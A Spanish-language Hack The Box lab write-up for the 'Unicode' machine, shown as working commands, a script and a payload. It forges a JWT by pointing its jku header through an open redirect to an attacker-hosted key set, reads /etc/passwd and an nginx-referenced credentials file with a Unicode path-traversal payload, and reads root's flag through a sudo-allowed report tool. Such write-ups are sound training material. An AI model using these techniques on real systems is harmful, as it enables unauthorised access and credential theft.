---
title: Unicode Writeup
author: xdann1
date: 2022-05-07
categories: [Writeup, HTB]
tags: [Linux, CTF, Medium, JWT, LFI]
image:
  path: ../../assets/img/commons/unicode/unicode.png
  width: 800
  height: 500
  alt: Banner Unicode
---

Máquina Medium, crearemos un token malicioso en una web para hacernos pasar por un administrador, en el panel de administrador encontraremos un LFI, consiguiendo listar un archivo con credenciales, por último, vemos que podemos ejecutar un binario como root, lo ejecutamos y conseguimos leer la flag de root.

## Recopilación de Información

Primero vamos a comprobar la conectividad con la máquina.

```plaintext
❯ ping -c 1 10.10.11.126
PING 10.10.11.126 (10.10.11.126) 56(84) bytes of data.
64 bytes from 10.10.11.126: icmp_seq=1 ttl=63 time=34.9 ms

--- 10.10.11.126 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 34.921/34.921/34.921/0.000 ms
```

En la salida del comando anterior se puede ver un parámetro llamado `ttl`, gracias a este parámetro podemos saber que sistema operativo está corriendo en la máquina víctima.
* GNU/Linux = TTL 64
* Windows = TTL 128

En este caso, el sistema operativo que está corriendo en la máquina víctima es GNU/Linux.

Vamos a usar la herramienta `nmap` para descubrir que puertos están abiertos y que servicios estan asociados a estos.

```plaintext
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.126 -oG allPorts
```

* -p- > Escanea todos los puertos (65535)
* --open > Muestra solo los puertos con un estatus "open"
* -sS > Aplica un TCP SYN Scan
* --min-rate 5000 > Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo
* -vvv > Muestra la información en pantalla a medida que se descubre
* -n > Indica que no aplique resolución DNS
* -Pn > Indica que no aplique el protocolo ARP
* 10.10.10.11.126 > Dirección IP que se quiere escanear
* -oG allPorts > Exporta el output a un fichero grepeable con nombre "allPorts"

Este sería el output del comando

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-05 23:44 CEST
Scanning 10.10.11.126 [65535 ports]
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Ahora vamos a realizar un escaneo más profundo, también con `nmap` pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.

```plaintext
❯ nmap -p22,80 -sC -sV 10.10.11.126 -oN targeted
```

* -p22,80 > Indica los puertos que se quieren escanear, en este caso el 22 y 80
* -sC > Lanza scripts básicos de enumeración
* -sV > Enumera la versión y servicio que está corriendo en los puertos
* 10.10.10.126 > Dirección IP que se quiere escanear
* -oN targeted > Exporta el output a un fichero en formato nmap con nombre "targeted"

Este sería el output del comando:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-05 23:47 CEST
Nmap scan report for 10.10.11.126
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)
|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)
|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: 503
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

Los puertos abiertos y sus servicios asocidados son:

* 22/tcp > ssh
* 80/tcp > http

Empezaremos enumerando el puerto 80, primero podemos hacer un reconocimiento web con `dirsearch`, utilizaremos fuerza bruta para enumerar recursos.

```plaintext
disearch -u http://10.10.11.126 -x 503
```
* -u http://10.10.11.126 > Indica la url
* -x 503 > Oculta las peticiones con un código de estado

Los recursos que hemos hallado son los siguientes:

```plaintext
Target: http://10.10.11.126/

[00:34:38] Starting: 
[00:34:53] 308 -  264B  - /checkout  ->  http://10.10.11.126/checkout/
[00:34:55] 308 -  266B  - /dashboard  ->  http://10.10.11.126/dashboard/
[00:34:55] 308 -  258B  - /debug  ->  http://10.10.11.126/debug/
[00:34:55] 502 -  568B  - /debug/
[00:34:56] 308 -  258B  - /error  ->  http://10.10.11.126/error/
[00:34:59] 308 -  264B  - /internal  ->  http://10.10.11.126/internal/
[00:35:01] 200 -  84KB  - /login/
[00:35:07] 308 -  264B  - /redirect  ->  http://10.10.11.126/redirect/
[00:35:09] 404 -  564B  - /static/api/swagger.yaml
[00:35:09] 404 -  564B  - /static/api/swagger.json
[00:35:09] 404 -  564B  - /static/dump.sql
[00:35:12] 308 -  260B  - /upload  ->  http://10.10.11.126/upload/
```

No tenemos nada demasiado interesante de momento, sigamos mirando que nos puede ofrecer la página. Si investigamos más a fondo podemos ver que estamos arrastrando una cookie.

Si observamos el código fuente de la página podemos encontrarnos con lo siguiente `/redirect/?url=google.com` esto nos puede servir para más adelante.

# Busqueda de vulnerabilidades

Vamos a analizar la cookie que estamos arrastrando, parece que es un `JWT` (JSON Web Token), estos tokens estan divididos en 3 partes:

* Header > usualmente consiste en dos partes, la primera parte (typ), indica el tipo de token y la segunda (alg) indica el algoritmo que ha sido utilizado.
* Payload > contiene parámetros del token, existen tres tipos de parámtros, registered, public y private. 
* Signature > se utiliza para verificar que el emisor del JWT es quien dice ser y para garantizar que el mensaje no hay sido modificado, esta parte es creada firmando con el algoritmo especificado el header, el payload y una llave.

![Token JWT]({{ 'assets/img/commons/unicode/partes.png' | relative_url }}){: .center-image }
_Partes Token JWT_

Los tokens JWT podemos descifrarlos utilizando la siguiente [web](https://jwt.io/).

![Token JWT]({{ 'assets/img/commons/unicode/jwt.png' | relative_url }}){: .center-image }
_JWT Descifrado_

En la parte de los headers vemos un parámetro llamado `jku`, este parámetro es una URI que apunta a un recurso con claves públicas codificadas en JSON, una de estas claves se corresponde con la utilizada para crear la parte `signature` del Token JWT.

Intentemos acceder a la url que contiene la clave que verifica los tokens, para ellos tendremos que añadir el dominio `hackmedia.htb` al fichero /etc/hosts.

```json
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs",
            "e": "AQAB"
        }
    ]
}
```

Puesto que la clave que se utiliza para verificar el token se extrae del certificado ubicado en la URI (jku), podríamos intentar generar un nuevo token malicioso que tenga como URI una clave alojada en nuestro servidor para así hacernos pasar por otro usuario.

# Explotación

Primeramente crearemos las claves con las que verificaremos y crearemos el token.

```plaintext
❯ openssl genrsa -out keypair.pem 2048
❯ openssl rsa -in keypair.pem -pubout -out publickey.crt
❯ openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
* publickey.crt > clave pública
* pkcs8.key > clave privada

Ya teniendo la clave pública y privada podremos crear un token malicioso. Utilizaremos el siguiente script para generarlo, este script manipula la URI del parámetro `jku` asignandole una URL con la pueda llegar a conectarse a nuestro servidor ayudandose de la ruta que encontramos al principio, asigna el valor admin al parámetro `user` y, finalmente firma el token con el par de claves.

```python
#!/usr/bin/python3

from email import header
from jwcrypto import jwk, jwt

with open("keypair.pem", "rb") as pemfile:
    key = jwk.JWK.from_pem(pemfile.read())

Token = jwt.JWT(header={"alg": "RS256","jku": "http://hackmedia.htb/static/../redirect?url=10.10.14.242:8080/jwks.json"},claims={"user":"admin"})
Token.make_signed_token(key)
print(Token.serialize())
```
Este sería nuestro token malicioso:

```plaintext
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTQuMjQyOjgwODAvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.qRR4zH6-LJJuOmxVUIyuEzsW4ijqm1VnmUhDSZRVLSIOKFpC8Om5HssQGdLma3d-Zkw8gkISGy0mQ7J8hG9ODH1kinPnIL9u5BL4pyztmMUUqHXqIQ11EVmxH2gwL4laHKg86t_VZ3TwoIp7ruDbZ_Aaqu1ESPN0LpBevqKu54BgnFgogSqt8ruzzlU5IuQrje3zPf7g1QSr7sgARwIL5qRf19atR_lz-l-V411HZ5ItCRlsyr__r2QO3DtD03OuF2Wk8MJH4F1LjxEwB-M0v6W6JQf-bxx9AAoA401FBoP7_wES1T-SFjruU2gF8mHGdgk-5lWVnvS5R4zrwS8I8Q
```

Ahora generaremos el archivo que validará el token y que será apuntado por el parámetro `jku` de nuestro token malicioso. Para ello primero nos traeremos el que trae la máquina víctima.

```plaintext
❯ wget http://hackmedia.htb/static/jwks.json
```

Este fichero será al que apuntemos con el parametro `jku` para que nos valide el token, primero necesitaremos sustituir los parametros `n` y `e` de nuestra clave pública por los de el fichero jwks.json, para conseguir `n` y `e` de la clave pública utilizaremos el siguiente script:

```python
#!/usr/bin/python3

import jwkest
from Crypto.PublicKey import RSA

fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()


print("n:", jwkest.long_to_base64(key.n))
print("e:", jwkest.long_to_base64(key.e))
```
* n: qV5Smp4lxwvgY8POIWXWpAsDDBatymCkAIxBS4sgsuk49Lb29zNiLififZz4v6z9VOywTxJBHi6a0t06QyeyfPg0roa8t-JqlDuWjAjF6F80nB4yBh-u6u8ggTRSR-cpLrr3d0QbNHTOQB2zrpCXuUW3uY-BUNk2QyPPCjzyZdO1RGZBEXtTo6CTZecEqFd0Li0cK9NywPzSqUuzzHe9pzmDMQONUezkcxTtN9tbcOiHMrsUTpwxzNeyGu9Mtt3gI2Hle6gYNFWdxsY7S642KYgRAu6OVi5nwwi46n2J41n7fnskk6Hzpr2o-jg93zMZfit1JV2rRLG__p-k1EldaQ
* e: AQAB

Cuando ya hayamos sustituido los parámetros `n` y `e` en el archivo jwks.json y tengamos preparado el token malicioso nos levantaremos un servidor web para que cuando se vaya a validar el token pueda apuntar al archivo que tenemos en local.

```plaintext
❯ python -m http.server 8080
```

Editamos la cookie con el token JWT malicioso y recargamos la página.

![Dashboard]({{ 'assets/img/commons/unicode/dashboard.png' | relative_url }}){: .center-image }
_Panel de Administración_

Analizando el panel de adminitración podemos ver algunas cosas interesantes como la url del apartado `Current month` y `Last quarter`. A simple vista se hace parecido a un LFI (Local File Inclusion), sin embargo, no conseguimos acceder a ningun archivo, tendremos que tirar de algún bypass para poder listar archivos. Buscando encontré la siguiente [página](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html).

Entre todos los bypass que he visto solo he encontrado uno que me haya servido, es el siguiente:

```plaintext
http://hackmedia.htb/display/?page=%E2%80%A4%E2%80%A4%EF%BC%8F%E2%80%A4%E2%80%A4%EF%BC%8F%E2%80%A4%E2%80%A4%EF%BC%8F%E2%80%A4%E2%80%A4%EF%BC%8Fetc%EF%BC%8Fpasswd
```

Ya tenemos una forma potencial de enumerar archivos, como se esta utilizando `nginx` como servidor web podríamos empezar a enumerar los archivos de configuración del servidor. Empezaremos con el fichero `/etc/nginx/nginx.conf`.

El fichero llama a otros recursos, empezaremos a enumerar lo que hay dentro de estas carpetas. Encontramos un fichero muy interesante ubicado en `/etc/nginx/sites-enabled/default`, este fichero nos indica la existencia de un fichero con credenciales, las credenciales son guardadas en el fichero `/home/code/coder/db.yaml`. Accedemos al archivo y veremos las credenciales.

```plaintext
mysql_host: "localhost"
mysql_user: "code"
mysql_password: "B3stC0d3r2021@@!"
mysql_db: "user"
```

Estas credenciales nos servirán para conectarnos por ssh.

# Post-explotación

Ya podemos leer la flag del usuario

```plaintext
❯ cat user.txt
bb562deb8b7b476e****************
```

Vamos a ver si podemos interactuar con algun ejecutable sin proporcionar contraseñas.

```plaintext 
❯ sudo -l
Matching Defaults entries for code on code:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User code may run the following commands on code:
    (root) NOPASSWD: /usr/bin/treport
```

Vemos que podemos interactuar con el ejectuble `treport` como el usuario root sin proporcionar contraseña.

Al ejecurtarlo nos da 3 opciones, crear un reporte, leer un reporte o descargar un reporte. En este punto lo que podriamos hacer es descargarnos como un reporte la flag de root. 

```plaintext
❯ sudo treport 
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
❯ Enter your choice:3
❯ Enter the IP/file_name:File:///root/root.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    33  100    33    0     0  16500      0 --:--:-- --:--:-- --:--:-- 16500
❯ Enter your choice:2
ALL THE THREAT REPORTS:
threat_report_08_59_01
❯ Enter the filename:threat_report_08_59_01
25bebc130f32b387****************
```
